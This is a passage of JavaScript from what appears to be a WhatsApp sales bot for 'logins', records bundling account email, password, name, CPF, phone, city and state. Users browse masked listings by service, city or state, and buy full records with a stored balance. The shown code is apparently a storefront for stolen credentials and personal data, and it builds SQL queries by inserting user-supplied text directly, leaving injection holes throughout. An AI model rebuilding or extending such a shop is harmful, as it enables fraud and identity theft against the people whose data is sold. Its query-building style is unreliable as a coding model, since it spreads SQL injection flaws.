        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/deservicologin===") > -1 && Adms.includes(Numero)) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            if (Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }

            msg = Mensagem_Texto.split("===")
            SERVICO = msg[1]

            await DataBase_Better.prepare(`DELETE FROM LOGINS WHERE SERVICO = '${SERVICO}'`).run();
            Texto = `*TODOS OS SERVIÇOS (${SERVICO}) DO ESTOQU FORAM DELETADOS COM SUCESSO!*`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳




        TIPOMENU_ATUAL = await DataBase_Better.prepare(`SELECT TIPOMENU_ATUAL FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["TIPOMENU_ATUAL"]
        if ((TIPOMENU_ATUAL).toString() === "a") {

            //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
            if (Mensagem_ID_Lista_Array_Partes[1] === "catalogo_logins") {
                MODO_VENDA_LOGIN = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MODO_VENDA_LOGIN'`).get()["VALOR"]

                TEXTO_MENU_LOGIN = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'TEXTO_MENU_LOGIN'`).get()["VALOR"]

                SALDO_USUARIO = await DataBase_Better.prepare(`SELECT SALDO FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["SALDO"]
                SALDO_USUARIO = parseFloat(SALDO_USUARIO).toFixed(2)

                Itens_Lista = []
                iD_Footer = Date.now()

                if (MODO_VENDA_LOGIN === "1") {
                    Categorias = await DataBase_Better.prepare(`SELECT _rowid_,SERVICO FROM LOGINS`).all();
                    if (Categorias.length === 0) {

                        Texto = `*INFELIZMENTE ESTAMOS SEM MATERIAL NO ESTOQUE, NOSSA EQUIPE FOI NOTIFICADA!*`
                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

                        Texto = `⚠️ *ATENÇÃO ADM* ⚠️

Usuário: wa.me/${Numero}

Tentou efetuar a compra de logins, mas o estoque está vazio!`
                        for await (adm of Adms) {
                            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                        }
                        Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                    }

                    CONSTRUCAO_LISTMESSAGE_buttonText = `SERVICO`
                    CONSTRUCAO_LISTMESSAGE_title = "SERVICO"
                    CONSTRUCAO_LISTMESSAGE_description = `Clique em *OPÇÕES* para escolher O Login desejado.

◆ ━━━━❪✪❫━━━━ ◆
❖ *Seu número:* ${Numero}
❖ *Saldo Atual:* R\$: ${SALDO_USUARIO}
◆ ━━━━❪✪❫━━━━ ◆

${TEXTO_MENU_LOGIN}`

                    CONSTRUCAO_LISTMESSAGE_rows = []
                    iD_Footer = Date.now()

                    Array_Tipos_Em_Estoque = await DataBase_Better.prepare(`SELECT MIN(_rowid_) AS _rowid_, SERVICO FROM LOGINS GROUP BY SERVICO`).all();
                    for await (Categoria of Array_Tipos_Em_Estoque) {

                        Algum_Login = await DataBase_Better.prepare(`SELECT * FROM LOGINS WHERE SERVICO = '${Categoria["SERVICO"]}' LIMIT 1`).all();
                        Estoque = await DataBase_Better.prepare(`SELECT SERVICO FROM LOGINS WHERE SERVICO = '${Categoria["SERVICO"]}'`).all();

                        try {
                            CONSTRUCAO_LISTMESSAGE_rows.push({
                                rowId: `${iD_Footer.toString()}|filtro_login_modovendalogin1|${Categoria["SERVICO"]}`,
                                title: Categoria["SERVICO"],
                                description: `💰 R$:${Algum_Login[0]["PRECO"]}
| Estoque Login: ${Estoque.length}`
                            })
                        } catch (error) {
                            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                        }
                    }

                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                } else {

                    CONSTRUCAO_LISTMESSAGE_buttonText = `OPÇÕES`
                    CONSTRUCAO_LISTMESSAGE_title = "LOGIN"
                    CONSTRUCAO_LISTMESSAGE_description = `Clique em *OPÇÕES* para escolher O Login desejado.

◆ ━━━━❪✪❫━━━━ ◆
❖ *Seu número:* ${Numero}
❖ *Saldo Atual:* R\$: ${SALDO_USUARIO}
◆ ━━━━❪✪❫━━━━ ◆

${TEXTO_MENU_LOGIN}`

                    CONSTRUCAO_LISTMESSAGE_rows = []
                    iD_Footer = Date.now()

                    Array_Tipos_Em_Estoque = await DataBase_Better.prepare(`SELECT MIN(_rowid_) AS _rowid_, SERVICO FROM LOGINS GROUP BY SERVICO`).all();
                    for await (Categoria of Array_Tipos_Em_Estoque) {

                        CONSTRUCAO_LISTMESSAGE_rows.push(
                            {
                                rowId: `${iD_Footer.toString()}|filtro_login_modovendalogin2_tipo1|servico`,
                                title: "💳 LOGIN POR APP/LOJA/SERVIÇO",
                                description: " ",
                            },
                            {
                                rowId: `${iD_Footer.toString()}|filtro_login_modovendalogin2_tipo1|cidade`,
                                title: "🏦 LOGIN POR CIDADE",
                                description: " ",
                            },
                            {
                                rowId: `${iD_Footer.toString()}|filtro_login_modovendalogin2_tipo1|estado`,
                                title: "🚩 LOGIN POR ESTADO",
                                description: " ",
                            },
                            {
                                rowId: `${iD_Footer.toString()}|`,
                                title: "🔙 MENU",
                                description: " ",
                            }
                        )
                    }

                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
            }
            //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

            //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
            if (Mensagem_ID_Lista_Array_Partes[1] === "filtro_login_modovendalogin2_tipo1") {
                iD_Footer = Date.now()

                if (Mensagem_ID_Lista_Array_Partes[2] === "servico") {
                    COLUNA = "SERVICO"
                    COLUNA_Visual = "SERVIÇOS"
                }
                if (Mensagem_ID_Lista_Array_Partes[2] === "cidade") {
                    COLUNA = "CIDADE"
                    COLUNA_Visual = "CIDADES"
                }
                if (Mensagem_ID_Lista_Array_Partes[2] === "estado") {
                    COLUNA = "ESTADO"
                    COLUNA_Visual = "ESTADOS"
                }

                Categorias = await DataBase_Better.prepare(`SELECT _rowid_,${COLUNA} FROM LOGINS`).all();
                if (Categorias.length === 0) {

                    Texto = `*INFELIZMENTE ESTAMOS SEM MATERIAL NO ESTOQUE, NOSSA EQUIPE FOI NOTIFICADA!*`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                    Texto = `⚠️ *ATENÇÃO ADM* ⚠️

Usuário: wa.me/${Numero}

Tentou efetuar a compra de logins, mas o estoque está vazio!`
                    for await (adm of Adms) {
                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    }
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }

                CONSTRUCAO_LISTMESSAGE_buttonText = COLUNA
                CONSTRUCAO_LISTMESSAGE_title = COLUNA
                CONSTRUCAO_LISTMESSAGE_description = `*PESQUISA POR ${COLUNA}*

Confira a lista filtrada por: ${COLUNA}, para encontrar o Login desejado.`

                CONSTRUCAO_LISTMESSAGE_rows = []
                iD_Footer = Date.now()

                Array_Tipos_Em_Estoque = await DataBase_Better.prepare(`SELECT MIN(_rowid_) AS _rowid_, ${COLUNA} FROM LOGINS GROUP BY ${COLUNA}`).all();
                for await (Categoria of Array_Tipos_Em_Estoque) {
                    Estoque = await DataBase_Better.prepare(`SELECT ${COLUNA} FROM LOGINS WHERE ${COLUNA} = '${Categoria[COLUNA]}'`).all();

                    try {
                        CONSTRUCAO_LISTMESSAGE_rows.push({
                            rowId: `${iD_Footer.toString()}|filtro_login_modovendalogin2_tipo2|${COLUNA}|${Categoria[COLUNA]}`,
                            title: Categoria[COLUNA],
                            description: `TIPO: ${COLUNA_Visual}
ESTOQUE TOTAL: ${Estoque.length}`
                        })
                    } catch (error) {
                        Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                    }
                }

                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
            //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

            //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
            if (Mensagem_ID_Lista_Array_Partes[1] === "filtro_login_modovendalogin2_tipo2") {
                iD_Footer = Date.now()

                COLUNA = Mensagem_ID_Lista_Array_Partes[2]
                PARAMETRO = Mensagem_ID_Lista_Array_Partes[3]

                CONSTRUCAO_LISTMESSAGE_buttonText = "Opções de Logins"
                CONSTRUCAO_LISTMESSAGE_title = "Selecione o login e clique no botão enviar."
                CONSTRUCAO_LISTMESSAGE_description = `📱 *LISTA DE LOGINS* 📱

Clique em *Opções de Logins*, escolha o login e ao selecionar e enviar, caso você possua saldo suficiente, você estará efetuando a compra.

⚠️*MUITA ATENÇÃO AO ESCOLHER O LOGIN DESEJADO!*⚠️`

                CONSTRUCAO_LISTMESSAGE_rows = []
                iD_Footer = Date.now()

                Array_CCs = await DataBase_Better.prepare(`SELECT _rowid_,SERVICO,EMAIL,SENHA,NOME,CPF,USER,TELEFONE,ESTADO,CIDADE,ADICIONAIS,PRECO,DATA_MS_INSERIDO FROM LOGINS WHERE ${COLUNA} = '${PARAMETRO}'`).all();
                for await (item of Array_CCs) {
                    //console.log(item)
                    ID = item["rowid"]
                    SERVICO = item["SERVICO"]
                    EMAIL = item["EMAIL"]
                    if (EMAIL === "0") {
                        EMAIL = ""
                    } else {
                        EMAIL_Digitos = EMAIL.match(/./igm)
                        EMAIL = `${EMAIL_Digitos[0]}${EMAIL_Digitos[1]}${EMAIL_Digitos[2]}${EMAIL_Digitos[3]}${EMAIL_Digitos[4]}${EMAIL_Digitos[5]}*******@********`
                    }
                    SENHA = `************`
                    NOME = item["NOME"]
                    CPF = item["CPF"]
                    if (CPF === "0") {
                        CPF = ""
                    } else {
                        CPF_Digitos = CPF.match(/./igm)
                        CPF = `${CPF_Digitos[0]}${CPF_Digitos[1]}${CPF_Digitos[2]}${CPF_Digitos[3]}${CPF_Digitos[4]}${CPF_Digitos[5]}******`
                    }
                    USER = `**********`
                    TELEFONE = `**(**) * ****-****`
                    ESTADO = item["ESTADO"]
                    CIDADE = item["CIDADE"]
                    ADICIONAIS = item["ADICIONAIS"]
                    PRECO = item["PRECO"]


                    CONSTRUCAO_LISTMESSAGE_rows.push({
                        rowId: `${iD_Footer.toString()}|id_login_sera_comprado|${ID}`,
                        title: `${SERVICO}`,
                        description: `💰R$:${PRECO}
💠${EMAIL}
🏛${NOME}
🌍${CIDADE}
🏳️${ESTADO}
ID:${ID}
`
                    })
                }
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
            //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

            //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
            if (Mensagem_ID_Lista_Array_Partes[1] === "filtro_login_modovendalogin1") {

                SERVICO = Mensagem_ID_Lista_Array_Partes[2]

                SERVICO_Existe = await DataBase_Better.prepare(`SELECT _rowid_ FROM LOGINS WHERE SERVICO = '${SERVICO}'`).get()
                if (SERVICO_Existe === undefined) {
                    Texto = `Desculpe, Não temos mais logins ${SERVICO} no estoque!`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }

                item = await DataBase_Better.prepare(`SELECT _rowid_,SERVICO,EMAIL,SENHA,NOME,CPF,USER,TELEFONE,ESTADO,CIDADE,ADICIONAIS,PRECO,DATA_MS_INSERIDO FROM LOGINS WHERE SERVICO = '${SERVICO}' LIMIT 1`).all();
                //console.log(SERVICO)
                //console.log(item)
                //console.log(item[0]["rowid"])
                //console.log(item[0]["PRECO"])
                ID = item[0]["rowid"]
                SERVICO = item[0]["SERVICO"]
                EMAIL = item[0]["EMAIL"]
                SENHA = item[0]["SENHA"]
                NOME = item[0]["NOME"]
                CPF = item[0]["CPF"]
                USER = item[0]["USER"]
                TELEFONE = item[0]["CPF"]
                ESTADO = item[0]["ESTADO"]
                CIDADE = item[0]["CIDADE"]
                ADICIONAIS = item[0]["ADICIONAIS"]
                PRECO = item[0]["PRECO"]

                PRECO_LOGIN = parseFloat(PRECO).toFixed(2)
                if (parseFloat(PRECO) === 0 || parseFloat(PRECO) === 0.00) {

                    Texto = `Não foi possível efetuar a compra deste Login, pois o valor do mesmo não foi definido. Nossa equipe foi notificada!`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                    Texto = `*ATENÇÃO ADM*

Numero: wa.me/${Numero}, Tentou comprar um Login que não possui preço definido.

REVISE AS TABELAS DE PREÇOS E DEFINA OS PREÇOS DOS LOGINS COM CUSTO R$:0`
                    for await (adm of Adms) {
